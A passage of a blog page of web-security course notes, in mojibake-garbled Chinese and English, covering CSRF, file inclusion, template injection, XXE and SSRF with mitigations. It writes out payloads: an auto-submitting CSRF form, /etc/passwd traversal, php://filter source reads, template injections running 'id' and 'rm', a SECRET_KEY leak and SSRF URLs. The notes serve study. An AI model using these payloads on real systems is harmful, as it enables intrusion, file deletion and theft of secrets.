åœ¨æ¯ç§æƒ…å†µä¸‹éƒ½ç»è¿‡ä¸¥æ ¼éªŒè¯ã€‚åŠ¨æ€æ¯æ¬¡åŠ è½½ä»»ä½•é¡µé¢æ— æ³•é¢„æµ‹ã€‚</li>
<li><strong>Referrers æ¨èäºº</strong>: é™¤ CSRF ä»¤ç‰Œå¤–,
ä»…å°†ç‰¹å®šæ¨èäººåˆ—å…¥ç™½åå•</li>
<li>CORS è®¾ç½®: ä»…å…è®¸å—ä¿¡ä»»çš„æºï¼
<ul>
<li>ä¸è¦åš: <code>Access-Control-Allow-Origin: *</code></li>
</ul></li>
</ol>
<h6 id="exploit-6">Exploit</h6>
<ol type="1">
<li><p>é¦–å…ˆBurp-suite intercept æˆªè·ä¿®æ”¹emailçš„è¯·æ±‚, å¾—åˆ°:
<code>CSRF</code></p></li>
<li><p>ç”¨è·å–çš„<code>CSRF</code>, å†²æ´—å‘é€HTMLè¯·æ±‚</p>
<ol type="1">
<li>```html
<html>
<body>
<form action="{url}" method="POST" id="form1">
<input type="hidden" name="email" value="{url_encoded_new_email}"/>
<input type="hidden" name="csrf" value="ZX8jzwyJaLCgHSvUb7YRiNMZA22l7q9J"/>
<input type="submit" value="Submit request"/>
</form>
</body>
<script>
    document.getElementById("form1").submit()
  </script>
</html>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## LDAP Injection</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; è½»é‡çº§ç›®å½•è®¿é—®åè®®, ä¸ SQLi éå¸¸ç›¸ä¼¼, æ“ä½œ LDAP æŸ¥è¯¢ä»¥æ‰§è¡Œæ‰€éœ€æ“ä½œ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Local File Inclusion æœ¬åœ°â½‚ä»¶åŒ…å« (LFI)</span><br><span class="line"></span><br><span class="line">#### Directory Traversal Attack ç›®å½•éå†æ”»å‡»</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">`/../../etc/passwd`</span><br><span class="line"></span><br><span class="line">#### PHP Protocol</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">`/&#123;dynamic_url&#125;?&#123;params&#125;=php:<span class="comment">//filter/read=convert.base64-encode/resource=&#123;target php file&#125;`</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Remote File Inclusion è¿œç¨‹â½‚ä»¶åŒ…å«(RFI)</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; ä¸ LFl ç›¸åŒ, å¯¼è‡´ç›¸åŒçš„æ¼æ´, ä½¿ç”¨ç›¸åŒçš„åè®®, ä½†ç°åœ¨å¯è¿œç¨‹è·å–</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Filter Bypasses</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; è¿‡æ»¤å™¨å¯ä»¥ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ–ä»»ä½•ç±»å‹çš„å­—ç¬¦ä¸²åŒ¹é…</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Code Injection</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; è¿™ç§æ”»å‡»å¯èƒ½æ˜¯ç›²ç›®çš„, æ°¸è¿œè®°å¾—å°è¯•å¼•å…¥æ—¶é—´å»¶è¿Ÿï¼ˆç¡çœ ï¼‰æˆ–å¤–éƒ¨æœåŠ¡å™¨äº¤äº’</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## log injection â½‡å¿—æ³¨â¼Š</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line">ä¸è¦å‘ç”¨æˆ·å…¬å¼€æ—¥å¿—ã€‚ä»–ä»¬ä¸åº”è¯¥çœ‹åˆ°ä»–ä»¬ã€‚åœ¨å°†ç”¨æˆ·è¾“å…¥å­˜å‚¨åœ¨æ—¥å¿—ä¸­ä¹‹å‰, è¯·å…ˆå¯¹å…¶è¿›è¡Œæ¸…ç†ã€‚ä¸å…è®¸ç”¨æˆ·æ§åˆ¶æ—¥å¿—çš„è·¯å¾„/æ–‡ä»¶å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## OS Command Injection æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨â¼Š</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; æ²¡æœ‰æ­£ç¡®æ¸…ç†ç”¨æˆ·è¾“å…¥ã€‚å°†æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ä¸ºç”¨æˆ·è¾“å…¥</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> é’ˆå¯¹å…è®¸å€¼çš„ç™½åå•è¿›è¡ŒéªŒè¯ã€‚</span><br><span class="line"><span class="number">2.</span> éªŒè¯è¾“å…¥æ˜¯å¦ä¸ºæ•°å­—ï¼ˆå¦‚æœè¾“å…¥æ˜¯é¢„æœŸçš„æ•°å­—ï¼‰ã€‚</span><br><span class="line"><span class="number">3.</span> éªŒè¯è¾“å…¥æ˜¯å¦ä»…åŒ…å«å­—æ¯æ•°å­—å­—ç¬¦, è€Œä¸åŒ…å«å…¶ä»–å­—ç¬¦è¯­æ³•æˆ–ç©ºæ ¼ã€‚</span><br><span class="line"><span class="number">4.</span> ä¸å…è®¸ç”¨æˆ·è¾“å…¥åˆ°è¾¾æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼ä½ æ˜¯åœ¨æ‰¾éº»çƒ¦, é‡æ–°æ¶æ„è¯¥è½¯ä»¶è¦é¿å…è¿™ç§æƒ…å†µï¼</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Buffer Overflow</span><br><span class="line"></span><br><span class="line">#### Low-level memory ä½çº§å†…å­˜</span><br><span class="line"></span><br><span class="line">- CPUæ¶æ„</span><br><span class="line">  - åŒ…å« CPU æ³¨å†Œå™¨</span><br><span class="line">  - <span class="number">16</span> ä¸ªé€šç”¨å¯„å­˜å™¨, ç”¨äº <span class="number">64</span> ä½ ï¼ˆx86<span class="number">-64</span>ï¼‰</span><br><span class="line">  - <span class="number">8</span> ä¸ªé€šç”¨å¯„å­˜å™¨, ç”¨äº <span class="number">32</span> ä½ï¼ˆx86ï¼‰</span><br><span class="line">  - Cache Stores ç¼“å­˜: å°†ä¿¡æ¯å­˜å‚¨ä¸€å®šæ—¶é—´</span><br><span class="line">    - éšç€é‡‘å­—å¡”çš„ä¸‹è¡Œ, å­˜å‚¨å˜å¾—è¶Šæ¥è¶Šä¾¿å®œå’Œç¼“æ…¢ã€‚</span><br><span class="line">  - Elastic Instruction Pointer (EIP): å¼¹æ€§æŒ‡ä»¤æŒ‡é’ˆ</span><br><span class="line">  - Elastic Base Pointer (EBP): å¼¹æ€§åŸºç¡€æŒ‡é’ˆ</span><br><span class="line">  - Elastic Stack Pointer (ESP): å¼¹æ€§å †æ ˆæŒ‡é’ˆ</span><br><span class="line">  - Endianness: å­—èŠ‚åº</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; è¿‡åº¦å¡«å……ç¼“å†²åŒº, ç›´åˆ°è¦†ç›–å†…å­˜ä½ç½®, ä»è€Œå¯¼è‡´åº”ç”¨ç¨‹åºæµå‘ç”Ÿæ›´æ”¹ã€‚é€šå¸¸, æˆ‘ä»¬å°è¯•æ¥ç®¡ERIP, å› ä¸ºå®ƒä½¿æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶ç¨‹åºæ‰§è¡Œæµã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Format string attack</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; åˆ©ç”¨è¯­è¨€æä¾›çš„æ‰“å°å‘½ä»¤, ä½¿å¼€å‘äººå‘˜æ›´å®¹æ˜“æ‰“å°, å…è®¸å¼€å‘äººå‘˜æŒ‡å®šå˜é‡çš„æ•°æ®ç±»å‹å’Œä½ç½®, åœ¨æ‰“å°å­—ç¬¦ä¸²ä¸­,å¼€å‘äººå‘˜å¯ä»¥ä½¿ç”¨å®ƒæ¥æ‰“å°å­—ç¬¦ä¸²ã€æ•´æ•°ã€å†…å­˜ä½ç½®ç­‰ã€‚</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">###### Impact</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> DOS æ³›çº¢æ”»å‡»</span><br><span class="line"><span class="number">2.</span> Information leakage</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> åˆ‡å‹¿è®©ç”¨æˆ·æ§åˆ¶èƒ½å¤Ÿè®¾ç½®æ ¼å¼çš„æ‰“å°è¯­å¥</span><br><span class="line"><span class="number">2.</span> å¦‚æœå¯ä»¥, åˆ™é»˜è®¤ä¸º `%s`</span><br><span class="line"><span class="number">3.</span> **æ¸…ç† Sanitise** ç”¨æˆ·è¾“å…¥: `%`</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## [Server-Side Template Injection (SSIT)](https:<span class="comment">//portswigger.net/web-security/server-side-template-injection) æœåŠ¡å™¨ç«¯æ¨¡æ¿æ³¨â¼Š</span></span><br><span class="line"></span><br><span class="line">###### Template engine: `Jinja2`</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line">&gt; éœ€è¦ URL Encoding</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> è¿ç®—:  `&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= <span class="number">7</span>*<span class="number">7</span> %&gt;`</span><br><span class="line"><span class="number">2.</span> ç³»ç»Ÿå‘½ä»¤: `&#123;dynamic_url&#125;?&#123;param&#125;=&lt;%= <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>) %&gt;`</span><br><span class="line"><span class="number">3.</span> åˆ é™¤: `&lt;%= <span class="keyword">system</span>(<span class="string">&#x27;rm &#123;target_file&#125;&#x27;</span>) %&gt;`</span><br><span class="line"></span><br><span class="line">&gt; å¹¶ä¸”ä¸åŒFramworkæœ‰ä¸åŒçš„è¯­æ³•:</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> [TOMADO](https:<span class="comment">//portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)</span></span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> æ‰§è¡Œä»»æ„ Python: `&#123;% somePython %&#125;`</span><br><span class="line">   <span class="number">2.</span> åˆ é™¤: `&#123;%<span class="keyword">import</span> os%&#125;&#123;&#123;os.<span class="keyword">system</span>(<span class="string">&#x27;rm /home/carlos/morale.txt&#x27;</span>)`</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> Django</span><br><span class="line"></span><br><span class="line">   <span class="number">1.</span> `&#123;% debug %&#125;`</span><br><span class="line">   <span class="number">2.</span> `&#123;&#123;settings.SECRET_KEY&#125;&#125;`</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> ä¸å…è®¸ç”¨æˆ·ç›´æ¥åœ¨æ¨¡æ¿ä¸­è¾“å…¥ä¿¡æ¯</span><br><span class="line"><span class="number">2.</span> å§‹ç»ˆå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œ**æ¸…ç† Sanitise**</span><br><span class="line"><span class="number">3.</span> ä½¿ç”¨ WAF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### HTTP Splitting/Smuggling æ‹†åˆ†</span><br><span class="line"></span><br><span class="line">###### å®šä¹‰</span><br><span class="line"></span><br><span class="line">&gt; å®ƒåŸºæœ¬ä¸Šæ˜¯ä½¿ç”¨æ”»å‡»è€…çš„è¾“å…¥æ¶æ„åœ°ä»æœåŠ¡å™¨æ‹†åˆ†å“åº”ã€‚é€šå¸¸å‘ç°äºæœªç»æ¶ˆæ¯’çš„ç”¨æˆ·è¾“å…¥ä¸­, åæ˜ åœ¨å“åº”ä¸­</span><br><span class="line"></span><br><span class="line">###### Carriage Return Line Feed (CRLF)</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å›è½¦çº¿è·¯é¦ˆé€</span><br><span class="line"><span class="number">2.</span> å­—ç¬¦:  `\r`, `\n`</span><br><span class="line"><span class="number">3.</span> URL encoded:  `%<span class="number">0</span>d`, `%<span class="number">0</span>a`</span><br><span class="line"><span class="number">4.</span> ç”¨äºç»ˆæ­¢çº¿è·¯</span><br><span class="line"><span class="number">5.</span> å¯æ¶æ„ç”¨äºæ‹†åˆ†å“åº”</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> æ¸…ç†ç”¨æˆ·è¾“å…¥</span><br><span class="line"><span class="number">2.</span> ç­›é€‰ç”¨æˆ·è¾“å…¥ä»¥å¿½ç•¥ `\r`, `\n` å’Œ `%<span class="number">0</span>d`, `%<span class="number">0</span>a`</span><br><span class="line"><span class="number">3.</span> ä½¿ç”¨ WAF</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### HTTP Desynchronisation Attacks HTTPå»åŒæ­¥æ”»å‡»</span><br><span class="line"></span><br><span class="line">######  **å®šä¹‰**</span><br><span class="line"></span><br><span class="line">&gt; å‰ç«¯å’Œåç«¯æœåŠ¡å™¨ä¹‹é—´çš„ä¸åŒæ­¥, ä¸æŸç§ä»£ç†æˆ–ç¼“å­˜æœåŠ¡å™¨ç›¸å…³, ç±»ä¼¼äºç¼“å†²åŒºæº¢å‡º</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å¦‚æœæ‚¨æ²¡æœ‰ CDNã€åå‘ä»£ç†æˆ–è´Ÿè½½å‡è¡¡å™¨, åˆ™ä¸ä¼šå—åˆ°æ”»å‡»ã€‚</span><br><span class="line"><span class="number">2.</span> å°†å‰ç«¯é…ç½®ä¸ºç‹¬å ä½¿ç”¨ HTTP/<span class="number">2</span></span><br><span class="line"><span class="number">3.</span> æ ¹æ®æœ‰æ•ˆè´Ÿè½½å¤§å°æ£€æŸ¥å†…å®¹é•¿åº¦æ ‡å¤´å€¼</span><br><span class="line"></span><br><span class="line">#### Web Cache Deception ç½‘ç»œç¼“å­˜æ¬ºéª—</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## (XXE)</span><br><span class="line"></span><br><span class="line">#### XML eXternal Entities (XXE) XML çš„å¤–éƒ¨å®ä½“</span><br><span class="line"></span><br><span class="line">&gt; åˆ©ç”¨åº”ç”¨ç¨‹åºå¤„ç† XML ä¿¡æ¯ã€‚ </span><br><span class="line">&gt;</span><br><span class="line">&gt; æ–‡æ¡£ç±»å‹å®šä¹‰: å®šä¹‰ XML æ–‡æ¡£çš„ç»“æ„, ä¸åŒç±»å‹çš„ XML æ–‡æ¡£å°†ä½¿ç”¨ä¸åŒçš„**DTD**ã€‚</span><br><span class="line">&gt;</span><br><span class="line">&gt; ä¾‹å¦‚: XHTMLä¸¥æ ¼ä½¿ç”¨ä¸åŒçš„**DTO**åˆ°XHTMLè¿‡æ¸¡</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### Billion Laughs</span><br><span class="line"></span><br><span class="line">ä»¥é€’å½’æ–¹å¼å¼•ç”¨å®ä½“, æ¶ˆè€—æœåŠ¡å™¨èµ„æº</span><br><span class="line"></span><br><span class="line">###### Exploit</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> å®šä¹‰ä¸€ä¸ªå®ä½“ï¼ˆå¦‚ CDATA lolï¼‰</span><br><span class="line"><span class="number">2.</span> å®šä¹‰æ›´å¤šå¤šæ¬¡å¼•ç”¨å‰ä¸€ä¸ªå®ä½“çš„å®ä½“</span><br><span class="line"><span class="number">3.</span> ä½¿ç”¨çš„å®ä½“çº§åˆ«è¶Šå¤š, æ¼æ´åˆ©ç”¨å°±è¶Šæœ‰æ•ˆ</span><br><span class="line"></span><br><span class="line">###### Impact</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> æ­¤æ¼æ´ä»¥æŒ‡æ•°çº§å¢é•¿</span><br><span class="line"></span><br><span class="line">###### Mitigation</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> é™åˆ¶å…è®¸å¤„ç†çš„é€’å½’å®ä½“çš„æ•°é‡</span><br><span class="line"><span class="number">2.</span> é…ç½®åˆ†æå™¨ä»¥å®‰å…¨åœ°å¤„ç† XML å®ä½“</span><br><span class="line"><span class="number">3.</span> ä»…å¤„ç†å—ä¿¡ä»»çš„ DTD æ–‡ä»¶</span><br><span class="line"><span class="number">4.</span> ä¸å¤„ç†å†…è”å®ä½“</span><br><span class="line"><span class="number">5.</span> é™åˆ¶è§£æå™¨å’Œåº”ç”¨ç¨‹åºå¯ç”¨çš„å†…å­˜é‡: è¿™å¯ç¡®ä¿å¯¹ä¸€ä¸ªåº”ç”¨ç¨‹åºçš„æ‹’ç»æœåŠ¡ä¸ä¼šå½±å“ä¸æ˜¯åŒä¸€æœåŠ¡å™¨çš„å…¶ä»–åº”ç”¨ç¨‹åºï¼ˆæˆ–åŒä¸€åº”ç”¨ç¨‹åºçš„å…¶ä»–éƒ¨åˆ†ï¼‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### é€šè¿‡XEEå®ç°SSRF</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line"><span class="comment">// https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf</span></span><br><span class="line">!DOCTYPE test [</span><br><span class="line">	&lt;!ENTITY attack SYSTEM <span class="string">&quot;http://locahost/&#123;path&#125;&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></li>
</ol></li>
</ol>
<h2 id="server-side-request-forgery-ssrf-æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ">Server-Side
Request Forgery (SSRF) æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ </h2>
<h4 id="data-exfiltration-æ•°æ®æ³„éœ²">Data Exfiltration æ•°æ®æ³„éœ²</h4>
<h6 id="å®šä¹‰-2">å®šä¹‰</h6>
<blockquote>
<p>ä»æœåŠ¡å™¨çªƒå–æ•°æ®, å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼å®Œæˆ: åŒ…æ‹¬é€šè¿‡HTTP, DNS,
ç”šè‡³é€šè¿‡è®¿é—®ç‰¹å®šé¡µé¢ï¼ å¯ä»¥å¸®åŠ©çªƒå–å¯†ç æ–‡ä»¶,
é…ç½®æ–‡ä»¶å’Œå„ç§æ•æ„Ÿä¿¡æ¯ã€‚</p>
</blockquote>
<h4
id="æ ¹æ®æ³„æ¼çš„dynamic-url-parameterå‘èµ·ä¼ªé€ æœåŠ¡ç«¯è¯·æ±‚">æ ¹æ®æ³„æ¼çš„Dynamic
URL &amp; Parameterå‘èµ·ä¼ªé€ æœåŠ¡ç«¯è¯·æ±‚</h4>
<h6 id="exploit-7">Exploit</h6>
<ol type="1">
<li>External:
<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=&#123;external_website&#125;</code></li>
<li>Internal:
<code>http://&#123;target_domain&#125;/&#123;dynamic_url&#125;?&#123;param&#125;=http://localhost:&#123;vulnerable_port&#125;/path/file.txt</code></li>
</ol>
<h4 id="remote-code-execution-rce-è¿œç¨‹æ‰§è¡Œä»£ç "><strong>Remote Code
Execution (RCE) è¿œç¨‹æ‰§è¡Œä»£ç </strong></h4>
<ol type="1">
<li>å°è¯•ä½¿ç”¨ <code>expect://</code>
<ol type="1">
<li>è¿™æ˜¯ä¸€ä¸ªéœ€è¦æ˜¾å¼å¯ç”¨çš„åŒ…è£…å™¨, ä¾‹å¦‚: <code>expect://ls</code></li>
</ol></li>
<li>è¿˜å¯ä»¥ä½¿ç”¨å…¶ä»–åè®®æ¥å‘æŒ¥æ‚¨çš„ä¼˜åŠ¿, ä¾‹å¦‚: <code>gopher:</code></li>
</ol>
<h2 id="authorisation-vs-authentication">Authorisation vs
Authentication</h2>
<h2 id="serialisation-vs-deserialisation">Serialisation vs
Deserialisation</h2>
<p><strong>Serialisation</strong>: Marshalling,
<code>Data Structure =&gt; String/Buffer</code>
<strong>Deserialisation</strong>: Unmarshalling,
<code>String/Buffer =&gt; Data Structure</code></p>

  </div>
    <hr>
    <br>
   <!-- <div>é˜…è¯»æ¬¡æ•°<span id="busuanzi_value_page_pv"></span>æ¬¡</div> -->
   <div>Posts Contains: <span class="post-count">3.7k</span> Words</div>
   <!-- <div>Reading Time: <span class="post-count">16</span>Min's</div> -->
     <!-- æ‰“èµ -->
     <!-- æ‰“èµåŠŸèƒ½å¼€å…³-->
      <!-- æ·»åŠ æèµ å›¾æ ‡ -->
<div class ="post-donate">
    <div id="donate_board" class="donate_bar center">
        <div>ğŸ‘‰ğŸ»<a id="btn_donate" class="btn_donate" href="javascript:;" title="æ‰“èµ">ğŸ§§</a>ğŸ‘ˆğŸ»</div>
        <span class="donate_txt">
           â†‘<br>
           â€¢ æ‰“èµå°å‘¨ â€¢ <!--è¿™ä¸ªå€¼é…ç½®åœ¨ä¸»é¢˜çš„._config.ymlä¸­-->
        </span>
        <br>
      </div>  
    <div id="donate_guide" class="donate_bar center hidden" >
        <!-- æ”¯ä»˜å®æ‰“èµå›¾æ¡ˆ -->
        <!-- <img src="./images/WeChatpay.jpg" alt="æ”¯ä»˜å®æ‰“èµ"> -->
        <!-- å¾®ä¿¡æ‰“èµå›¾æ¡ˆ -->
        <img src="https://zhidongzhou.github.io/z/images/weChatPay.jpg" alt="å¾®ä¿¡æ‰“èµ">
    </div>
    <script type="text/javascript">
        document.getElementById('btn_donate').onclick = function(){
            $('#donate_board').addClass('hidden');
            $('#donate_guide').removeClass('hidden');
        }
    </script>
</div>
<!-- æ·»åŠ æèµ å›¾æ ‡ -->
    
</article>
<div><!-- Valine -->

    <div class="blog-post-comments">
        <section id="comment">
            <div id="valine_container" class="valine_thread"></div>
        </section>
        <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
        <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
        <script>
            var GUEST_INFO = ['nick', 'mail', 'link'];
            var guest_info = 'nick,mail,link'.split(',').filter(function (item) {
                return GUEST_INFO.indexOf(item) > -1
            });
            var notify = 'true' == true;
            var verify = 'false' == true;
            var valine = new Valine();
            valine.init({
                el: '#valine_container',
                notify: notify,
                verify: verify,
                appId: "tPqQzJulKGGdtnC1z2YQUn1W-gzGzoHsz",
                appKey: "F7c8R6ipy1FgLulcivI5BU0e",
                placeholder: "Leave Comments Â· Â· Â·",
                pageSize: '10',
                avatar: 'retro',
                lang: 'en'
            })
        </script>
    </div>

</div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Posts</a></li>
         
          <li><a href="/categories/">Categories</a></li>
         
          <li><a href="/tags/">Tags</a></li>
         
          <li><a href="/search/">ğŸ”</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#comp90074-web-security-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">COMP90074 Web Security
ç½‘ç»œå®‰å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.1.</span> <span class="toc-text">åŸºç¡€</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#owasp-top-10-web-vulnerabilities-2017"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">OWASP Top 10 web
vulnerabilities (2017)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#terminology"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Terminology</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#permission-%E6%9D%83%E9%99%90"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">Permission æƒé™</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#html-events"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">HTML Events</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-cookies-%E4%BF%A1%E6%81%AF%E8%AE%B0%E5%BD%95%E7%A8%8B%E5%BA%8F"><span class="toc-number">1.1.0.5.</span> <span class="toc-text">HTTP Cookies ä¿¡æ¯è®°å½•ç¨‹åº</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#domain-name-service-dns-%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E7%B3%BB%E7%BB%9F"><span class="toc-number">1.1.0.6.</span> <span class="toc-text">Domain Name Service (DNS)
åŸŸåæœåŠ¡ç³»ç»Ÿ</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#asynchronous%E5%BC%82%E6%AD%A5-javascript-and-xml-ajax"><span class="toc-number">1.1.0.7.</span> <span class="toc-text">Asynchronouså¼‚æ­¥
JavaScript And XML (AJAX)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#document-object-model-dom-%E6%96%87%E6%A1%A3%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B"><span class="toc-number">1.1.0.8.</span> <span class="toc-text">Document Object Model
(DOM) æ–‡æ¡£å¯¹è±¡æ¨¡å‹</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss-vs-csrf-vs-ssrf"><span class="toc-number">1.2.</span> <span class="toc-text">XSS vs CSRF vs SSRF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#timing-attacks"><span class="toc-number">1.3.</span> <span class="toc-text">Timing Attacks</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit"><span class="toc-number">1.3.0.0.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xss"><span class="toc-number">1.4.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#impact"><span class="toc-number">1.4.0.0.0.1.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation"><span class="toc-number">1.4.0.0.0.2.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#stored-xss"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">Stored XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-1"><span class="toc-number">1.4.0.1.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dom-based-xss"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">DOM-Based XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-2"><span class="toc-number">1.4.0.2.0.1.</span> <span class="toc-text">Exploit</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#http-parameter-pollution-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">HTTP Parameter Pollution
å‚æ•°æ±¡æŸ“</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">1.4.0.3.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#tabnapping-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%88%86%E9%A1%B5%E7%BB%91%E6%9E%B6"><span class="toc-number">1.4.0.4.</span> <span class="toc-text">Tabnapping æµè§ˆå™¨åˆ†é¡µç»‘æ¶</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89-1"><span class="toc-number">1.4.0.4.0.1.</span> <span class="toc-text">å®šä¹‰</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#exploit-3"><span class="toc-number">1.4.0.4.0.2.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#impact-1"><span class="toc-number">1.4.0.4.0.3.</span> <span class="toc-text">Impact</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#remediation-1"><span class="toc-number">1.4.0.4.0.4.</span> <span class="toc-text">Remediation</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#clickjacking-%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><span class="toc-number">1.4.0.5.</span> <span class="toc-text">Clickjacking ç‚¹å‡»åŠ«æŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" 